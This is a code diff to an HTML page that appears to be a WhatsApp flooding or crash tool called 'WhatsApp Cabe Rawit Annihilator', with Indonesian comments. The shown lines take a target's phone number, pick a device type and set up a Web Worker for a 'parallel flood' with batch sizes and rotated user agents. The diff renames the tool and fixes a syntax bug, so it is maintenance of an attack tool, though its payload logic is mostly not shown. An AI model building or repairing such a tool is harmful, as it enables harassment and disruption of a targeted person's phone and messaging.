@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WhatsApp Cabe Rawit Annihilator by Th3-GPT</title>
+    <!-- Tambah favicon dummy biar ga error 404 -->
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgo=">
     <style>
         body {
             background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
@@ -80,7 +82,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Infinity Error Whatsapp By Mr.4Rex_503</h1>
+        <h1>WhatsApp Cabe Rawit Annihilator</h1>
         <input type="text" id="phoneNumber" placeholder="Masukkan nomor target (+62...)">
         <select id="deviceType">
             <option value="android">Android</option>
@@ -174,7 +176,7 @@
                 ];
 
                 // Web Worker untuk paralel flood
-                const worker trit = `
+                const workerCode = `
                     self.onmessage = async function(e) {
                         const { endpoint, attackParams, userAgents } = e.data;
                         for (let i = 0; i < attackParams.batchSize; i++) {
